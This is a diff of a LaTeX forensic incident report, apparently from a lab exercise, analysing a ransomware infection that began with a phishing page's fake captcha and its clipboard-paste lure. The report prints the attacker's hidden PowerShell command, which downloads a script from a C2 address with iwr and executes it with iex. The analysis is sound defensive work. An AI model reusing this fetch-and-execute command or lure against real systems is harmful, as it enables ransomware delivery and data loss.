@@ -64,8 +64,7 @@ The attackers created fake urgency by claiming the user's account had been compr
 \clearpage
 \begin{landscape}
 \subsubsection{SIEM Analysis} \label{siem_fish}
-Filtering for the timeframe the incident occurred in (see \cref{fish_filet}), as well as for \enquote{Process Creation} events via EventID \textit{1}, revealed the command which enabled the ransomware to encrypt the system's files (see \cref{fish_reste}, later split into \cref{fish_script} - \cref{fish_time} for better legibility).
-
+Filtering for the timeframe the incident occurred in (see \cref{fish_filet}), as well as for \enquote{Process Creation} events via EventID \textit{1} \autocite{sysmon:1}, revealed the command which enabled the ransomware to encrypt the system's files (see \cref{fish_reste}).
 \begin{figure}[!htb]
 	\centering
 	\includegraphics[width=\linewidth]{forensics/3_siem/filter}
@@ -82,7 +81,7 @@ Filtering for the timeframe the incident occurred in (see \cref{fish_filet}), as
 	\label{fish_reste}
 \end{figure}
 
-The command seemingly responsible for the incident seems to be a PowerShell process started in the background with the \enquote{hidden} flag \autocite{microsoft:pwshll_hid} (see \cref{fish_reste}, marked red) (\textit{\textbackslash Powershell.exe" -w hidden}), which downloads the file \textit{download.txt} from the previously discovered C2-server via HTTP \autocite{microsoft:iwr} (\textit{iwr 'http://192.168.61.26:8080/download.txt'}) and executes the instructions contained in the downloaded file \autocite{microsoft:iex} (\textit{'iex (...).Content}).
+The command seemingly responsible for the incident seems to be a PowerShell process started in the background with the \enquote{hidden} flag \autocite{microsoft:pwshll_hid} (see \cref{fish_reste}, marked red) (\textit{\textbackslash Powershell.exe" -w hidden}), which downloads the file \textit{download.txt} from the previously discovered C2-server via HTTP \autocite{microsoft:iwr} (\textit{iwr 'http://192.168.61.26:8080/download.txt'}). This can be categorized as \textit{Ingress Tool Transfer (T1105)} \autocite{mitre:attack:T1105}. The command then executes the instructions contained in the downloaded file \autocite{microsoft:iex} (\textit{'iex (...).Content}).
 
 The computer the command ran on was called \textit{DESKTOP-FEA5EJA} (see \cref{fish_reste}, marked green).
 
@@ -183,9 +182,9 @@ The key and initialization vector were written to the following file (see \cref{
 	\label{shark_key_file}
 \end{figure}
 
-ChatGPT was prompted to create a script which reverses the encryption process (see Appendix, \cref{chatlog_small} - \cref{chatlog_prompt}). The script was then altered to additionally revert the wallpaper change, remove the created files (ransom note, key file, wallpaper). 
+ChatGPT was prompted to create a script which reverses the encryption process (see Appendix, \cref{chatlog_small} - \cref{chatlog_prompt}). The script was then altered to additionally revert the wallpaper change and remove the created files (ransom note, key file, wallpaper). 
 A prompt for user input was added as well to enable the \textit{PowerShell} process to be captured (see \cref{encr_script}).
-A default wallpaper was chosen since it was not apparent which wallpaper the user had before the incident and the script was executed (see \cref{encr_restr}).
+A default wallpaper was chosen, since it was not apparent which wallpaper the user had before the incident, and the script was executed (see \cref{encr_restr}).
 The decrypted files have been opened to prove that they have been decrypted (see Appendix, \cref{decrypted_files}).
 The script can be viewed in the appended files under:\\
 {
@@ -193,9 +192,9 @@ The script can be viewed in the appended files under:\\
 }
 
 \subsubsection{Attack Validation}
-Clicking on the link in the Phishing E-Mail opened the attacker's website, prompting the user to supposedly authenticate themselves. The received source code was assessed in the browser's network tab before continuing to interact with the website. This revealed that clicking on the presented button creates a popup with instructions to compromise the system (see \cref{captchga}). The button's onClick-handler calls a function \textit{verify()}, which drops the \textit{PowerShell} command discussed in \fullref{siem_fish} into the user's clipboard and creates a pop-up with instructions to execute it (see \cref{clipboard}).
+Clicking on the link in the Phishing E-Mail opened the attacker's website, prompting the user to supposedly authenticate themselves (see \cref{captchga}). The received source code was assessed in the browser's network tab before continuing to interact with the website. This revealed that the button's onClick-handler calls a function, which drops the \textit{PowerShell} command discussed in \fullref{siem_fish} into the user's clipboard and creates a pop-up with instructions to execute it (see \cref{clipboard}). This can be categorized as \textit{User Execution: Malicious Copy and Paste (T1204.004)} \autocite{mitre:attack:T1204:004}.
 
-The victim must have therefore clicked on the link, then clicked on the fake \textit{Captcha} button, followed the steps laid out in the popup, which led to the system fetching the script from the C2 server resulting in the victim's files being encrypted, which can be classified as \textit{Data Encrypted for Impact (T1486)} \autocite{mitre:attack:T1486}.
+The victim must have clicked on the link, then clicked on the fake \textit{Captcha} button, and followed the instructions in the popup. This led to their system fetching the script from the C2 server resulting in the victim's files being encrypted, which can be classified as \textit{Data Encrypted for Impact (T1486)} \autocite{mitre:attack:T1486}.
 
 \newpage \clearpage
 \begin{landscape}
